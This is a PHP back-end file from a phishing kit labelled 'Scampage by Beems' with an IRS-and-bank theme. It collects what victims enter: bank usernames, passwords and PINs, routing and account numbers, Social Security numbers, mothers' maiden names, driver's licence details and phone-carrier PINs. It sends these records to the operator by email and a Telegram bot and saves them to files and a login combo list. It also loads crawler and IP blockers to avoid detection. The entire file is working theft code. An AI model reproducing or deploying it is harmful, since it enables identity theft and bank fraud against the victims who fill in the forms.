<?php
session_start();
/*
* Scampage by Beems
* Jabber: beems@exploit.im
* ICQ: Beems
*/
require_once '../../main.php';

require_once '../../blocker.php';
if($block_referrer == "on") {
    require_once '../../crawlerdetect.php';
}
if($block_iprange == "on") {
    require_once '../../blacklist.php';
}
require_once '../session.php';

if (!$_POST['passwordbank']){
} else {
    $VictimInfo1 = "| Submitted by : " . $ip . " (" . gethostbyaddr($ip) . ")";
    $VictimInfo2 = "| Location : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| UserAgent : " . $user_agent . "";
    $VictimInfo4 = "| Browser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";
    $userbank = $_SESSION['userbank'] = $_POST['userbank'];
    $passwordbank = $_SESSION['passwordbank'] = $_POST['passwordbank'];
    $loginretry = $_SESSION['loginretry'] = $_POST['loginretry'];
    $accountNumber = $_SESSION['accountNumberInput'];
    $routingNumber = $_SESSION['routingNumberGroup'];
    $accountType = $_SESSION['accountType'];
    $PaypalBank = $_SESSION['bankname'];    
    $pinbank = $_SESSION['pinbank'] = $_POST['pinbank'] ;  

    $LicenseNumber = $_SESSION['LicenseNumber'];
    $LicenseNumberWeight = $_SESSION['LicenseNumberWeight'];
    $LicenseNumberHeight = $_SESSION['LicenseNumberHeight'];
    $LicenseNExp = $_SESSION['LicenseNExp'];
    $LicenseIss = $_SESSION['LicenseIss'];
    $MaidenName = $_SESSION['MaidenName'];
    $fullname = $_SESSION['fullname'];
    $DateOfBirth = $_SESSION['DateOfBirth'];
    $StreetAddress = $_SESSION['StreetAddress'];
    $StateRegion = $_SESSION['StateRegion'];
    $ZipCode = $_SESSION['ZipCode'];
    $CityR = $_SESSION['CityR'];
    $NumberPhone = $_SESSION['NumberPhone'];
    $NumberCarrier = $_SESSION['NumberCarrier'];
    $NumberPin = $_SESSION['NumberPin'];
    $SecurityNumber = $_SESSION['SecurityNumber'];
    $message = "+ -------- [ ⚡ Beems IRS ⚡ ] -----------+\n";
    $message .= "+ 💎 Personal Information\n";
    $message .= "| Full name : $fullname\n";
    $message .= "| Date of birth : $DateOfBirth\n";
    $message .= "| SSN : $SecurityNumber\n";
    $message .= "| MMN : $MaidenName\n";
    $message .= "| Address : $StreetAddress\n";
    $message .= "| State : $StateRegion\n";
    $message .= "| City : $CityR\n";
    $message .= "| Zip : $ZipCode\n";
    $message .= "| Telephone : $NumberPhone\n";
    if ($enablephonepin === "on") {
        $message .= "| Phone Carrier : $NumberCarrier\n";
        $message .= "| Phone Carrier Pin : $NumberPin\n";
    }
    $message .= "| License Number : $LicenseNumber\n";
    $message .= "| License Weight : $LicenseNumberWeight\n";
    $message .= "| License Height : $LicenseNumberHeight\n";
    $message .= "| License Issued State: $LicenseIss\n";
    $message .= "| License Expiry: $LicenseNExp\n";
    $message .= "+ ------------------------------------+\n";
    $message .="| 🏦 $PaypalBank Routing & Account Details\n";
    $message .="| Account Type : $accountType\n";
    $message .="| Routing Number : $routingNumber\n";
    $message .="| Account Number : $accountNumber\n";
    $message .= "+ ------------------------------------+\n";
    $message .="| 🏦 $PaypalBank Login Details $loginretry\n";
    $message .="| login : $userbank\n";
    $message .="| password : $passwordbank\n";
    if (isset($_POST['pinbank'])) {
        $message .="| Pin: $pinbank\n";
    }
    $message .="+ ------------------------------------+\n";
    $message .= "+ 🌐 Victim Information\n";
    $message .= "$VictimInfo1\n";
    $message .= "$VictimInfo2\n";
    $message .= "$VictimInfo3\n";
    $message .= "$VictimInfo4\n";
    $message .= "$VictimInfo5\n";
    $message .= "| 🕛 Received : $date\n";
    $message .= "+ ------------------------------------+\n";
    $subject = $PaypalBank." Login + FULLZ: ".$_SESSION['fullname']." [ $cn - $os - $ip ]";
    kirim_mail($email_result, $PaypalBank." + FULLZ", $subject, $message);
    kirim_tele($telegram_bot_token, $telegram_chat_id);
    tulis_file("../../data/Data_login_bank.txt", $message);
    if (!$_SESSION['routingNumberGroup']) {
        tulis_file("../../result/total_bank.txt", $ip);
    }
    if ($save_login_combo == "on") {
        tulis_file("../../data/login_combo.txt", $userbank.":".$passwordbank);
    }
    
}
if (isset($_POST['bankname'])) {
    if (isset($_POST['routingNumberGroup'])) {
        $VictimInfo1 = "| Submitted by : " . $ip . " (" . gethostbyaddr($ip) . ")";
        $VictimInfo2 = "| Location : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
        $VictimInfo3 = "| UserAgent : " . $user_agent . "";
        $VictimInfo4 = "| Browser : " . $br . "";
        $VictimInfo5 = "| Os : " . $os . "";
        $accountNumber = $_SESSION['accountNumberInput'] = $_POST['accountNumberInput'];
        $routingNumber = $_SESSION['routingNumberGroup'] = $_POST['routingNumberGroup'];
        $accountType = $_SESSION['accountType'] = $_POST['accountType'];
        $PaypalBank = $_SESSION['bankname'] = $_POST['bankname'] ;    
        $pinbank = $_SESSION['pinbank'] = $_POST['pinbank'] ;  

        $LicenseNumber = $_SESSION['LicenseNumber'];
        $LicenseNExp = $_SESSION['LicenseNExp'];
        $LicenseNumberWeight = $_SESSION['LicenseNumberWeight'];
        $LicenseNumberHeight = $_SESSION['LicenseNumberHeight'];
        $LicenseIss = $_SESSION['LicenseIss'];
        $MaidenName = $_SESSION['MaidenName'];
        $fullname = $_SESSION['fullname'];
        $DateOfBirth = $_SESSION['DateOfBirth'];
        $StreetAddress = $_SESSION['StreetAddress'];
        $StateRegion = $_SESSION['StateRegion'];
        $ZipCode = $_SESSION['ZipCode'];
        $CityR = $_SESSION['CityR'];
        $NumberPhone = $_SESSION['NumberPhone'];
        $NumberCarrier = $_SESSION['NumberCarrier'];
        $NumberPin = $_SESSION['NumberPin'];
        $SecurityNumber = $_SESSION['SecurityNumber'];
        $message = "+ -------- [ ⚡ Beems IRS ⚡ ] -----------+\n";
        $message .= "+ 💎 Personal Information\n";
        $message .= "| Full name : $fullname\n";
        $message .= "| Date of birth : $DateOfBirth\n";
        $message .= "| SSN : $SecurityNumber\n";
        $message .= "| MMN : $MaidenName\n";
        $message .= "| Address : $StreetAddress\n";
        $message .= "| State : $StateRegion\n";
        $message .= "| City : $CityR\n";
        $message .= "| Zip : $ZipCode\n";
        $message .= "| Telephone : $NumberPhone\n";
        if ($enablephonepin === "on") {
            $message .= "| Phone Carrier : $NumberCarrier\n";
            $message .= "| Phone Carrier Pin : $NumberPin\n";
        }
        $message .= "| License Number : $LicenseNumber\n";
        $message .= "| License Weight : $LicenseNumberWeight\n";
        $message .= "| License Height : $LicenseNumberHeight\n";
        $message .= "| License Issued State: $LicenseIss\n";
        $message .= "| License Expiry: $LicenseNExp\n";
        $message .= "+ ------------------------------------+\n";
        $message .="| 🏦 $PaypalBank Routing & Account Details\n";
        $message .="| Account Type : $accountType\n";
        $message .="| Routing Number : $routingNumber\n";
        $message .="| Account Number : $accountNumber\n";
        $message .= "+ ------------------------------------+\n";
        $message .= "+ 🌐 Victim Information\n";
        $message .= "$VictimInfo1\n";
        $message .= "$VictimInfo2\n";
        $message .= "$VictimInfo3\n";
        $message .= "$VictimInfo4\n";
        $message .= "$VictimInfo5\n";
        $message .= "| 🕛 Received : $date\n";
        $message .= "+ ------------------------------------+\n";

        $subject = $PaypalBank." + FULLZ: ".$_SESSION['fullname']." [ $cn - $os - $ip ]";
        kirim_mail($email_result, $PaypalBank."Routing & Account + FULLZ", $subject, $message);
        kirim_tele($telegram_bot_token, $telegram_chat_id);
        $dob_year = explode("/",$DateOfBirth);
        $dob_year = (end($dob_year));
        tulis_file("../../data/rezs/".$ip."_".$StateRegion."_".$dob_year.".txt", $message);
        tulis_file("../../data/Data_accountnumber_bank.txt", $message);
        tulis_file("../../result/total_bank.txt", $ip);
    }
}
?>